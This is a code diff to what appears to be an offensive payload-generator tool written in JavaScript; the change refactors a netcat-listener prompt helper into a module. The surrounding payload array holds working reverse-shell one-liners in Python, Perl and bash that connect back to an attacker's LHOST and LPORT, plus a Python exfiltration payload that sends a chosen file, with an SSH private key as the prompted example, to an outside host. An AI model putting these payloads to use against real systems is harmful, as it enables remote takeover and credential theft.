@@ -10,50 +10,7 @@ var red = log.red
 var ncat = require("../modules/ncat.js")
 
 // Todo (needs factoring)
-var ncatInit = function(returnToPrepare, msg, type){
 
-	if (msg){
-		prompt.message = msg
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			var a1 = result._
-			prompt.message = "Should I start a netcat listener for you? (Y/n)"
-
-			prompt.get([{name: '_', description: ':'}], function(err, result){
-				result._ = result._.toUpperCase()
-				if (result._ === "Y"){
-					if (type === "shell"){
-						var server = ncat.shell(returnToPrepare,a1)
-					}
-					else {
-						var server = ncat.file(returnToPrepare,a1)
-					}
-					
-				}
-				else {
-					returnToPrepare(a1)
-				}
-				
-			})
-			//returnToPrepare(result._)
-		})	
-	}
-	else {
-		prompt.message = "Should I start a netcat listener for you? (Y/n)"
-
-		prompt.get([{name: '_', description: ':'}], function(err, result){
-			result._ = result._.toUpperCase()
-			if (result._ === "Y"){
-				var server = ncat.shell(returnToPrepare)
-			}
-			else {
-				returnToPrepare()
-			}
-			
-		})
-	}
-
-
-}
 
 
 // Payload Array
@@ -94,7 +51,7 @@ Load({
 	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<PROMPT (shell type)>\",\"-i\"]);'",
 	category: "Reverse Shells",
 	callback: function(returnToPrepare){
-		ncatInit(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :", "shell")
+		ncat.Init(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :", "shell")
 	}
 })
 
@@ -103,7 +60,7 @@ Load({
 	payload: "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"<PROMPT (shell type)> -i\");};'",
 	category: "Reverse Shells",
 	callback: function(returnToPrepare){
-		ncatInit(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :", "shell")
+		ncat.Init(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :", "shell")
 	}
 })
 
@@ -112,7 +69,7 @@ Load({
 	payload: "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
 	category: "Reverse Shells",
 	callback: function(returnToPrepare){
-		ncatInit(returnToPrepare, null, "shell")
+		ncat.Init(returnToPrepare, null, "shell")
 	}
 })
 
@@ -125,7 +82,7 @@ Load({
 	sample: 'python -c \'exec """\nimport socket;import sys;s = socket.socket();s.connect(("$$LHOST$$",$$LPORT$$));f=open ("$$PROMPT$$", "rb");l = f.read(1024)\nwhile (l):\n    s.send(l)\n    l = f.read(1024)\ns.close();"""\'',
 	category: "Exfiltration",
 	callback: function(returnToPrepare){
-		ncatInit(returnToPrepare, "Which file would you like to exfiltrate? (ex: /.ssh/id_rsa) :", "file")
+		ncat.Init(returnToPrepare, "Which file would you like to exfiltrate? (ex: /.ssh/id_rsa) :", "file")
 	}
 })
 // 
